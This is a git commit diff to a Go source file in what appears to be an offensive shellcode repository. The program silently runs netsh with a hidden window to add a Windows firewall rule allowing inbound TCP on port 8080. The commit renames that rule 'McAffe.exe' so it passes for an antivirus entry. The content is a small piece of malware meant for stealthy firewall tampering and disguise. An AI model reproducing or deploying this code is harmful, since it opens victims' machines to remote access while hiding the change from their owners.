87c865515d869fbc6d3d847fe46683dcb3b9196f
Riccardo <134144784+riccio8@users.noreply.github.com>
2024-08-11 16:14:48 +0200

    Update tcp_port.go

--- shellcodes/shell_source_code/tcp_port.go
+++ shellcodes/shell_source_code/tcp_port.go
@@ -8,7 +8,7 @@ import (
 // wil work only for windows, if u want to do the same things on linux u have to delete the sys call
 
 func main() {
- cmd := exec.Command("cmd.exe", "/c", "netsh advfirewall firewall add rule name=\"Apri Porta 8080\" dir=in action=allow protocol=TCP localport=8080")
+ cmd := exec.Command("cmd.exe", "/c", "netsh advfirewall firewall add rule name=\"McAffe.exe\" dir=in action=allow protocol=TCP localport=8080")
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
  cmd.Run()
 }
